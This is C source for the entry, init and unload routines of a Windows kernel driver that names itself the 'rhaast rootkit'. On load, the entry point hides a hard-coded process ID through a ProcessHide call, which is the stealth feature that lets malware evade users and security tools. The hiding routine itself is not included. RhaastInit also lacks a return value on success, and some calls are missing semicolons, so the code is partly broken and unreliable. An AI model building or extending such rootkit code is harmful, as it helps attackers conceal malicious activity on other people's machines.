#include <Rhaast.h>

/**
 * @brief
 *		main entrypoint of the rhaast rootkit
 *  
 * @return	
 *		if successful executed function
 */
NTSTATUS RhaastEntry(
	VOID
) {
	NTSTATUS NtStatus = STATUS_SUCCESS;

	PUTS( "Rhaast loaded" );

	Instance.DriverObject->DriverUnload = ( PDRIVER_UNLOAD ) RhaastUnLoad; 

	/* print driver object data */
	PRINTF( 
		"Rhaast Driver Object: \n"
		" - Type        : %x   \n"
		" - Driver Name : %ls  \n",
		Instance.DriverObject->Type,
		Instance.DriverObject->DriverName.Buffer
	);

	/* init driver and other resources/info */
	if ( ! NT_SUCCESS( NtStatus = RhaastInit() ) ) {
		PUTS( "Failed to init Rhaast driver" )
		return NtStatus;
	}

	/* Process hide */
	ProcessHide( 9952 );

	return NtStatus; 
}

/**
 * @brief
 *		initiliaze rhaast rootkit features
 *
 * @return
 *		if successful executed function
 */
NTSTATUS RhaastInit(
	VOID
) {
	RTL_OSVERSIONINFOW OsVersion = { 0 };

	/* get windows version */
	if ( RtlGetVersion( &OsVersion ) ) {
		return STATUS_UNSUCCESSFUL;
	}

	/* set windows build number */
	Instance.WindowsBuild = OsVersion.dwBuildNumber;
}

/**
 * @brief
 *		Entry of unloading the rhaast driver from kernel 
 *		Free resources & memory
 * 
 * @param DriverObject
 *		DriverObject of the current rhaast rootkit
 */
VOID RhaastUnLoad(
	IN PDRIVER_OBJECT DriverObject
) {
	PUTS( "Starting to unload driver & resources" ); 

	/* register callbacks */
	// RsCallbacksUnRegister();

	PUTS( "Finished cleanup. Cya" ) 
}